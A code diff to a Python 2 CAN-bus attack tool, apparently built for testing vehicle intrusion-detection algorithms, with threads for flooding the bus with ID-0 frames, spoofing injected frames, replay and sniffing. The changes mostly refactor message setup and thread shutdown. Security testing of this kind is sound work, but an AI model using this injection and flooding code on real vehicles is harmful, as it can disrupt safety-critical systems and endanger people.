@@ -60,7 +60,7 @@ CASENAME ="busLoad.txt"
 NO_AUTH=False
 MSGS_QUEUE = []
 mutex = Lock()
-
+msg = CAN_MSG
 
 Engine_Speed = CAN_MSG
 Engine_Temp = CAN_MSG
@@ -129,12 +129,12 @@ class packageMsgForDOS(Thread):
         Thread.__init__(self)
 
     def run(self):
+        global msg
+        #start sending msgs of id =0 over the bus with max rate
+        msg.frame_id=0
+        msg.frame_dlc=8
+        msg.data='ffffffffffffffff'
         while True:
-            msg = CAN_MSG
-            #start sending msgs of id =0 over the bus with max rate
-            msg.frame_id=0
-            msg.frame_dlc=8
-            msg.data='ffffffffffffffff'
             global MSGS_QUEUE
             b=UCAN.UCAN_encode_message(msg)
             MSGS_QUEUE.append(b)
@@ -283,22 +283,25 @@ class spoofing(Thread):
         self.rate=rate
 
     def run(self):
-        msg = CAN_MSG
+        # msg = CAN_MSG
         if self.rate=='max' or self.rate =='MAX':
             rate_flag = 0
         elif self.rate ==0:
             print "ERROR RATE CAN NOT BE ZERO "
         else:
-            rate_flag = int(1/int(self.rate))
+            rate_flag = int(1/float(self.rate))
+        global msg
+        msg.frame_id=int(self.msg_id)
+        msg.data=self.val
+        msg.frame_dlc=len(self.val)/2
         while True:
             time.sleep(rate_flag)
             mutex.acquire()
-            msg.frame_id=int(self.msg_id)
-            msg.data=self.val
-            msg.frame_dlc=len(self.val)/2
             global MSG_COUNTER
             MSG_COUNTER +=1
             # try:
+            # b=UCAN.UCAN_encode_message(msg).buffer_info()
+            # print b
             ser.write(UCAN.UCAN_encode_message(msg))
             print "CAN Frame injected successfully"
             mutex.release()
@@ -538,6 +541,7 @@ if __name__ == '__main__':
                 print "DEBUG --> visualise the bus load is enabled which will visaulise after 60 second"
             try:
                 thread = visualize_busLoad()
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
             except:
@@ -597,12 +601,14 @@ if __name__ == '__main__':
             #detection report is required
             if arguments['<AlgorithmName>'] != None:
                 thread = detected('Spoofing',str(arguments['<AlgorithmName>']))
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
 
 
         try:
             thread=spoofing(msgArgs['ecu_name'],msgArgs['msg_id'],msgArgs['signal_name'],msgArgs['new_val'],msgArgs['msg_rate'])
+            thread.daemon=True
             thread.start()
             threads.append(thread)
         except:
@@ -637,6 +643,7 @@ if __name__ == '__main__':
                 print "DEBUG --> calcaulate the busload per second is enabled "
             try:
                 thread=calc_BusLoad()
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
             except:
@@ -644,6 +651,7 @@ if __name__ == '__main__':
 
         try:
             thread=sniffing()
+            thread.daemon=True
             thread.start()
             threads.append(thread)
         except:
@@ -667,6 +675,7 @@ if __name__ == '__main__':
                     print "DEBUG --> case name is " , arguments['<case_name>']
                 CASENAME = arguments['<case_name>']
             thread = calc_BusLoad()
+            thread.daemon=True
             thread.start()
             threads.append(thread)
 
@@ -681,6 +690,7 @@ if __name__ == '__main__':
         #detection report is required
             if arguments['<AlgorithmName>'] != None:
                 thread = detected('DOS',str(arguments['<AlgorithmName>']))
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
 
@@ -704,23 +714,31 @@ if __name__ == '__main__':
                 if arguments['<new_val>'] != None:
                     val = arguments['<new_val>']
                 thread = replay(target,True,val)
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
             else:
                 thread = replay(target,False,0)
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
         if arguments['--DR']==True:
         #detection report is required
             if arguments['<AlgorithmName>'] != None:
                 thread = detected('Replay',str(arguments['<AlgorithmName>']))
+                thread.daemon=True
                 thread.start()
                 threads.append(thread)
 
     #
     #joining threads
-    for thread in threads:
-        thread.join()
+    while len(threads) > 0:
+        try:
+            threads = [t.join(1000) for t in threads if t is not None and t.isAlive()]
+
+        except KeyboardInterrupt:
+            print 'Closing tool ...'
+            sys.exit()
 
     #close connection with the serial port
     if NO_AUTH == False:
